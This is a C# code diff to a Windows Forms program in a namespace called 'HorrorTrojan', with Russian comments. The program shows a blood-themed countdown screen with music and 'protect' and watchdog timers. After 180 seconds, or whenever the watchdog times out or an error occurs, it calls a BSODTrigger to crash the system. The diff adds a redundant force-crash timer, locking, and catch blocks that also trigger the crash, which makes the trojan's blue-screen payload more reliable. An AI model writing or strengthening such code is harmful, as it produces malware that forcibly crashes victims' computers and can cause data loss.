@@ -13,6 +13,7 @@ namespace HorrorTrojan
         private System.Windows.Forms.Timer drawTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer topMostTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer protectTimer = new System.Windows.Forms.Timer();
+        private System.Windows.Forms.Timer forceBSODTimer = new System.Windows.Forms.Timer(); // Дополнительный таймер
         private Random rnd = new Random();
         private DateTime startTime;
         private int maxSeconds = 180;
@@ -36,6 +37,7 @@ namespace HorrorTrojan
         private bool bsodTriggered = false;
         private bool musicInitialized = false;
         private bool timerCompleted = false;
+        private object timerLock = new object();
 
         public MainInterface()
         {
@@ -71,6 +73,9 @@ namespace HorrorTrojan
 
             protectTimer.Interval = 100;
             protectTimer.Tick += ProtectTimer_Tick;
+
+            forceBSODTimer.Interval = 1000;
+            forceBSODTimer.Tick += ForceBSODTimer_Tick;
 
             this.Load += MainInterface_Load;
             this.Paint += MainInterface_Paint;
@@ -161,23 +166,32 @@ namespace HorrorTrojan
         {
             while (watchdogAlive)
             {
-                Thread.Sleep(1000); // Проверка раз в секунду
+                Thread.Sleep(1000);
                 try
                 {
-                    // Увеличенный таймаут до 15 секунд
                     if ((DateTime.Now - lastPing).TotalSeconds > 15)
                     {
                         StopMusic();
-                        if (!bsodTriggered) BSODTrigger.TriggerBSOD();
+                        TriggerBSOD();
                         return;
                     }
                 }
                 catch
                 {
                     StopMusic();
-                    if (!bsodTriggered) BSODTrigger.TriggerBSOD();
+                    TriggerBSOD();
                     return;
                 }
+            }
+        }
+
+        private void TriggerBSOD()
+        {
+            lock (timerLock)
+            {
+                if (bsodTriggered) return;
+                bsodTriggered = true;
+                BSODTrigger.TriggerBSOD();
             }
         }
 
@@ -202,68 +216,129 @@ namespace HorrorTrojan
         {
             startTime = DateTime.Now;
             
-            // 1. Запускаем protectTimer для обновления lastPing
             protectTimer.Start();
-            
-            // 2. Даем время на первый Tick (200 мс достаточно)
             Thread.Sleep(200);
-            
-            // 3. Теперь безопасно запускаем watchdog
             SetupFullProtection();
-            
-            // 4. Запускаем остальные таймеры
             bloodTimer.Start();
             drawTimer.Start();
-            
-            // 5. Воспроизводим музыку
+            forceBSODTimer.Start(); // Дополнительный таймер для надежности
             PlayMusic();
         }
 
         private void BloodTimer_Tick(object sender, EventArgs e)
         {
-            TimeSpan elapsed = DateTime.Now - startTime;
-            
-            if (elapsed.TotalSeconds >= maxSeconds && !timerCompleted)
+            try
             {
-                timerCompleted = true;
+                TimeSpan elapsed = DateTime.Now - startTime;
+                double elapsedSeconds = elapsed.TotalSeconds;
                 
-                bloodTimer.Stop();
-                drawTimer.Stop();
-                protectTimer.Stop();
-                watchdogAlive = false;
-                StopMusic();
-                
-                if (!bsodTriggered)
+                // Проверка на BSOD
+                if (elapsedSeconds >= maxSeconds && !timerCompleted)
                 {
-                    bsodTriggered = true;
-                    BSODTrigger.TriggerBSOD();
+                    lock (timerLock)
+                    {
+                        if (timerCompleted) return;
+                        timerCompleted = true;
+                    }
+                    
+                    bloodTimer.Stop();
+                    drawTimer.Stop();
+                    protectTimer.Stop();
+                    forceBSODTimer.Stop();
+                    watchdogAlive = false;
+                    StopMusic();
+                    
+                    TriggerBSOD();
+                    return;
                 }
-                return;
+                
+                // Расчет уровня крови (только если не завершен)
+                if (!timerCompleted)
+                {
+                    double percent = (elapsedSeconds / maxSeconds) * 100.0;
+                    if (percent > 100) percent = 100;
+                    if (percent < 0) percent = 0;
+                    
+                    int newBloodLevel = 100 - (int)Math.Round(percent);
+                    if (newBloodLevel < 0) newBloodLevel = 0;
+                    if (newBloodLevel > 100) newBloodLevel = 100;
+                    
+                    // Обновляем только если изменилось
+                    if (bloodLevel != newBloodLevel)
+                    {
+                        bloodLevel = newBloodLevel;
+                    }
+                }
             }
-            
-            double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
-            if (percent > 100) percent = 100;
-            if (percent < 0) percent = 0;
-            
-            int newBloodLevel = 100 - (int)Math.Round(percent);
-            if (newBloodLevel < 0) newBloodLevel = 0;
-            if (newBloodLevel > 100) newBloodLevel = 100;
-            
-            bloodLevel = newBloodLevel;
+            catch
+            {
+                // При ошибке пробуем вызвать BSOD
+                TriggerBSOD();
+            }
+        }
+
+        private void ForceBSODTimer_Tick(object sender, EventArgs e)
+        {
+            try
+            {
+                TimeSpan elapsed = DateTime.Now - startTime;
+                
+                // Дополнительная проверка каждую секунду
+                if (elapsed.TotalSeconds >= maxSeconds && !timerCompleted && !bsodTriggered)
+                {
+                    lock (timerLock)
+                    {
+                        if (timerCompleted) return;
+                        timerCompleted = true;
+                    }
+                    
+                    bloodTimer.Stop();
+                    drawTimer.Stop();
+                    protectTimer.Stop();
+                    forceBSODTimer.Stop();
+                    watchdogAlive = false;
+                    StopMusic();
+                    
+                    TriggerBSOD();
+                }
+                
+                // Проверка, что bloodTimer жив
+                if (!bloodTimer.Enabled && !timerCompleted && !bsodTriggered)
+                {
+                    // Если bloodTimer остановлен, но BSOD еще не вызван - перезапускаем
+                    try { bloodTimer.Start(); } catch { }
+                }
+            }
+            catch
+            {
+                // При ошибке пробуем вызвать BSOD
+                if (!bsodTriggered && !timerCompleted)
+                {
+                    TriggerBSOD();
+                }
+            }
         }
 
         private void DrawTimer_Tick(object sender, EventArgs e)
         {
-            this.Invalidate();
+            try
+            {
+                this.Invalidate();
+            }
+            catch { }
         }
 
         private void MainInterface_Paint(object sender, PaintEventArgs e)
         {
-            Graphics g = e.Graphics;
-            g.Clear(Color.Maroon);
+            try
+            {
+                Graphics g = e.Graphics;
+                g.Clear(Color.Maroon);
 
-            DrawImage(g);
-            DrawBloodIndicator(g);
+                DrawImage(g);
+                DrawBloodIndicator(g);
+            }
+            catch { }
         }
 
         private void DrawImage(Graphics g)
@@ -402,6 +477,7 @@ namespace HorrorTrojan
                 drawTimer?.Dispose();
                 topMostTimer?.Dispose();
                 protectTimer?.Dispose();
+                forceBSODTimer?.Dispose();
                 horrorImage?.Dispose();
                 musicPlayer?.Dispose();
                 watchdogAlive = false;
